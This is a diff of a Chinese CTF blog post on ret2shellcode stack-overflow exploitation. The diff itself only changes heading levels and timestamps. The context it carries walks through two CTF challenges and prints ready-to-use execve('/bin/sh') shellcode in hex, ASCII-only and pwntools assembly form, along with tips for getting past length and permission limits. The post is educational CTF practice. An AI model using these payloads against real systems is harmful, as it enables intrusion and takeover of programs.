@@ -18,7 +18,7 @@
 <meta property="og:image" content="https://incldue.github.io/images/pwn1.png">
 <meta property="og:image" content="https://incldue.github.io/images/pwn2.png">
 <meta property="article:published_time" content="2025-11-04T16:00:00.000Z">
-<meta property="article:modified_time" content="2025-11-05T16:07:37.271Z">
+<meta property="article:modified_time" content="2025-11-05T16:27:04.062Z">
 <meta property="article:author" content="debu8ger">
 <meta property="article:tag" content="CTF基础知识">
 <meta property="article:tag" content="CTF赛题">
@@ -181,15 +181,15 @@ ga('send', 'pageview');
     <div class="article-entry post-content" itemprop="articleBody">
       
             
-            <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>ret2shellcode是栈溢出利用<code>ret2text</code>、<code>ret2shellcode</code>、<code>ret2libc</code>三大类中的一个，是指攻击者需要在程序没给shell的情况下自己调用<code>shell</code>的机器码(即<code>shellcode</code>)注入到程序内存中，随后就是利用栈溢出复写<code>return_address</code>，跳转至<code>shellcode所在内存</code>，执行shell命令，得到flag。</p>
-<h2 id="可能的exp姿势"><a href="#可能的exp姿势" class="headerlink" title="可能的exp姿势"></a>可能的exp姿势</h2><h3 id="1-注入shellcode至stack段中"><a href="#1-注入shellcode至stack段中" class="headerlink" title="1.注入shellcode至stack段中"></a>1.注入shellcode至stack段中</h3><p>这个现在其实很少见了，基本上都加了保护。其中，比较常见的保护手段有：</p>
+            <h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>ret2shellcode是栈溢出利用<code>ret2text</code>、<code>ret2shellcode</code>、<code>ret2libc</code>三大类中的一个，是指攻击者需要在程序没给shell的情况下自己调用<code>shell</code>的机器码(即<code>shellcode</code>)注入到程序内存中，随后就是利用栈溢出复写<code>return_address</code>，跳转至<code>shellcode所在内存</code>，执行shell命令，得到flag。</p>
+<h3 id="可能的exp姿势"><a href="#可能的exp姿势" class="headerlink" title="可能的exp姿势"></a>可能的exp姿势</h3><h4 id="1-注入shellcode至stack段中"><a href="#1-注入shellcode至stack段中" class="headerlink" title="1.注入shellcode至stack段中"></a>1.注入shellcode至stack段中</h4><p>这个现在其实很少见了，基本上都加了保护。其中，比较常见的保护手段有：</p>
 <ul>
 <li><strong>ASLR</strong>：其功能是将一部分内存段(如栈…)的地址<code>偏移</code>，在注入时难以定位其位置。</li>
 <li><strong>NX</strong>：使得部分内存段(如堆、栈…) <code>不可执行</code>，无法执行注入的代码。</li>
 <li><strong>Canary</strong>：原理是<code>在栈底插入cookie信息</code>，函数返回时将检测该信息<code>是否被改变</code>，若改变，则断定发生栈溢出</li>
 </ul>
-<h3 id="2-注入shellcode至bss段中"><a href="#2-注入shellcode至bss段中" class="headerlink" title="2.注入shellcode至bss段中"></a>2.注入shellcode至bss段中</h3><p>在虚拟内存当中，<code>bss段</code>主要保存无初值的全局变量&#x2F;静态变量(在assmbly中以<code>占位符？</code>声明)。若程序的bss段可写、可执行，则可以把shellcode写入全局变量&#x2F;静态变量中。</p>
-<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="一-GDOUCTF-2023-Shellcode"><a href="#一-GDOUCTF-2023-Shellcode" class="headerlink" title="一.[GDOUCTF 2023]Shellcode"></a>一.[GDOUCTF 2023]Shellcode</h3><p>拿到二进制文件，习惯性的<code>checksec</code>一下，看栈…的保护措施：</p>
+<h4 id="2-注入shellcode至bss段中"><a href="#2-注入shellcode至bss段中" class="headerlink" title="2.注入shellcode至bss段中"></a>2.注入shellcode至bss段中</h4><p>在虚拟内存当中，<code>bss段</code>主要保存无初值的全局变量&#x2F;静态变量(在assmbly中以<code>占位符？</code>声明)。若程序的bss段可写、可执行，则可以把shellcode写入全局变量&#x2F;静态变量中。</p>
+<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="一-GDOUCTF-2023-Shellcode"><a href="#一-GDOUCTF-2023-Shellcode" class="headerlink" title="一.[GDOUCTF 2023]Shellcode"></a>一.[GDOUCTF 2023]Shellcode</h4><p>拿到二进制文件，习惯性的<code>checksec</code>一下，看栈…的保护措施：</p>
 <p><img src="/images/pwn1.png" alt="pwn1"></p>
 <p>加了<strong>NX</strong>，不过没啥关系，</p>
 <p>放到IDA中反编译，定位到<code>main函数</code>：</p>
@@ -204,7 +204,7 @@ ga('send', 'pageview');
 
 <p>还有一种做法是<strong>手动构造shellcode</strong>，找一个小于25字节的shellcode。</p>
 <blockquote>
-<p>[!NOTE]</p>
+<p>[NOTE]</p>
 <p>32位短字节shellcode(21字节)：</p>
 <p>\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</p>
 <p>64位短字节shellcode(23字节)：</p>
@@ -215,7 +215,7 @@ ga('send', 'pageview');
 
 
 
-<h3 id="二-HNCTF-2022-Week1-safe-shellcode"><a href="#二-HNCTF-2022-Week1-safe-shellcode" class="headerlink" title="二.[HNCTF 2022 Week1]safe_shellcode"></a>二.[HNCTF 2022 Week1]safe_shellcode</h3><p>拿到附件，<code>checksec</code>一下，</p>
+<h4 id="二-HNCTF-2022-Week1-safe-shellcode"><a href="#二-HNCTF-2022-Week1-safe-shellcode" class="headerlink" title="二.[HNCTF 2022 Week1]safe_shellcode"></a>二.[HNCTF 2022 Week1]safe_shellcode</h4><p>拿到附件，<code>checksec</code>一下，</p>
 <p><img src="/images/pwn2.png" alt="pwn2"></p>
 <p>保护得还算少，</p>
 <p>IDA中反编译，定位<code>main函数</code>：</p>
@@ -226,7 +226,7 @@ ga('send', 'pageview');
 <p>我们使用<strong>纯ascii字符的shellcode</strong>：<code>Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t</code></p>
 <p>因为后面直接调用了<code>buff</code>的地址，所以无须栈溢出即可得到flag。</p>
 <blockquote>
-<p>[!NOTE]</p>
+<p>[NOTE]</p>
 <p> 32位 短字节shellcode –&gt; 21字节 \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80 </p>
 <p> 32位 纯ascii字符shellcode PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA </p>
 <p> 32位 scanf可读取的shellcode \xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff&#x2F;bin&#x2F;sh </p>
@@ -239,7 +239,7 @@ ga('send', 'pageview');
 
 
 
-<h2 id="绕过限制"><a href="#绕过限制" class="headerlink" title="绕过限制"></a>绕过限制</h2><h3 id="一-限制输入长度"><a href="#一-限制输入长度" class="headerlink" title="一.限制输入长度"></a>一.限制输入长度</h3><ol>
+<h3 id="绕过限制"><a href="#绕过限制" class="headerlink" title="绕过限制"></a>绕过限制</h3><h4 id="一-限制输入长度"><a href="#一-限制输入长度" class="headerlink" title="一.限制输入长度"></a>一.限制输入长度</h4><ol>
 <li><p><strong>利用短字节shellcode(32位)</strong></p>
 <p><code>getshell</code> - 21字节</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># (execve(&quot;/bin/sh&quot;,NULL,NULL))</span><br>shellcode = asm(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    push 0x68732f</span><br><span class="hljs-string">    push 0x6e69622f</span><br><span class="hljs-string">    mov ebx,esp</span><br><span class="hljs-string">    xor ecx,ecx</span><br><span class="hljs-string">    xor edx,edx</span><br><span class="hljs-string">    push 11</span><br><span class="hljs-string">    pop eax</span><br><span class="hljs-string">    int 0x80</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure>
@@ -270,7 +270,7 @@ ga('send', 'pageview');
 <p>ps:也可直接<code>\x00\x00</code>绕过</p>
 </li>
 </ol>
-<h3 id="二-限制权限"><a href="#二-限制权限" class="headerlink" title="二.限制权限"></a>二.限制权限</h3><ol>
+<h4 id="二-限制权限"><a href="#二-限制权限" class="headerlink" title="二.限制权限"></a>二.限制权限</h4><ol>
 <li><p><strong>限制shellcode无读写权限</strong></p>
 <p>利用<code>mprotect</code>给予读写权限，并再次利用<code>read</code>写入执行</p>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++">mprotect用法<br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mmap.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">mprotect</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *start, <span class="hljs-type">size_t</span> len, <span class="hljs-type">int</span> prot)</span></span>;<br></code></pre></td></tr></table></figure>
@@ -282,7 +282,7 @@ ga('send', 'pageview');
 <!--more-->
             <div class="post-copyright">
     <div class="content">
-        <p>最后更新： 2025年11月06日 00:07</p>
+        <p>最后更新： 2025年11月06日 00:27</p>
         <p>原始链接： <a class="post-url" href="" title="PWN练习之ret2shellcode">https://incldue.github.io/2025/11/05/PWN%E7%BB%83%E4%B9%A0%E4%B9%8Bret2shellcode/</a></p>
         <footer>
             <a href="https://incldue.github.io">
@@ -398,7 +398,7 @@ ga('send', 'pageview');
 
     <aside class="post-toc-pos post-toc-top" id="post-toc">
         <nav class="post-toc-wrap">
-            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="post-toc-text">概述</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E5%8F%AF%E8%83%BD%E7%9A%84exp%E5%A7%BF%E5%8A%BF"><span class="post-toc-text">可能的exp姿势</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#1-%E6%B3%A8%E5%85%A5shellcode%E8%87%B3stack%E6%AE%B5%E4%B8%AD"><span class="post-toc-text">1.注入shellcode至stack段中</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#2-%E6%B3%A8%E5%85%A5shellcode%E8%87%B3bss%E6%AE%B5%E4%B8%AD"><span class="post-toc-text">2.注入shellcode至bss段中</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="post-toc-text">例题</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E4%B8%80-GDOUCTF-2023-Shellcode"><span class="post-toc-text">一.[GDOUCTF 2023]Shellcode</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E4%BA%8C-HNCTF-2022-Week1-safe-shellcode"><span class="post-toc-text">二.[HNCTF 2022 Week1]safe_shellcode</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E7%BB%95%E8%BF%87%E9%99%90%E5%88%B6"><span class="post-toc-text">绕过限制</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E4%B8%80-%E9%99%90%E5%88%B6%E8%BE%93%E5%85%A5%E9%95%BF%E5%BA%A6"><span class="post-toc-text">一.限制输入长度</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E4%BA%8C-%E9%99%90%E5%88%B6%E6%9D%83%E9%99%90"><span class="post-toc-text">二.限制权限</span></a></li></ol></li></ol>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="post-toc-text">概述</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%8F%AF%E8%83%BD%E7%9A%84exp%E5%A7%BF%E5%8A%BF"><span class="post-toc-text">可能的exp姿势</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#1-%E6%B3%A8%E5%85%A5shellcode%E8%87%B3stack%E6%AE%B5%E4%B8%AD"><span class="post-toc-text">1.注入shellcode至stack段中</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#2-%E6%B3%A8%E5%85%A5shellcode%E8%87%B3bss%E6%AE%B5%E4%B8%AD"><span class="post-toc-text">2.注入shellcode至bss段中</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="post-toc-text">例题</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E4%B8%80-GDOUCTF-2023-Shellcode"><span class="post-toc-text">一.[GDOUCTF 2023]Shellcode</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E4%BA%8C-HNCTF-2022-Week1-safe-shellcode"><span class="post-toc-text">二.[HNCTF 2022 Week1]safe_shellcode</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E7%BB%95%E8%BF%87%E9%99%90%E5%88%B6"><span class="post-toc-text">绕过限制</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E4%B8%80-%E9%99%90%E5%88%B6%E8%BE%93%E5%85%A5%E9%95%BF%E5%BA%A6"><span class="post-toc-text">一.限制输入长度</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E4%BA%8C-%E9%99%90%E5%88%B6%E6%9D%83%E9%99%90"><span class="post-toc-text">二.限制权限</span></a></li></ol></li></ol>
         </nav>
     </aside>
     
